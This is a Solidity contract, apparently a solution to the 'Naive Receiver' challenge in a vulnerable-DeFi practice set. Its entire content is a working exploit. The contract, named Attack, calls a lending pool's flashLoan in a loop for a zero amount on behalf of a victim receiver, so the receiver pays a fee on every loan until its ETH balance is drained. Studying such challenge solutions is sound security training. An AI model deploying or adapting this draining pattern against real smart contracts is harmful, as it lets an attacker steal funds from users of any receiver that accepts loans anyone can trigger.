// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract Attack {
    NaiveReceiverLenderPool private immutable _POOL;
    FlashLoanReceiver private immutable _RECEIVER;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address pool, address receiver) {
        _POOL = NaiveReceiverLenderPool(payable(pool));
        _RECEIVER = FlashLoanReceiver(payable(receiver));
    }

    function attack() external {
        do {
            try _POOL.flashLoan(_RECEIVER, ETH, 0, "") {}
            catch {
                return;
            }
        } while (address(_RECEIVER).balance > 0);
    }
}
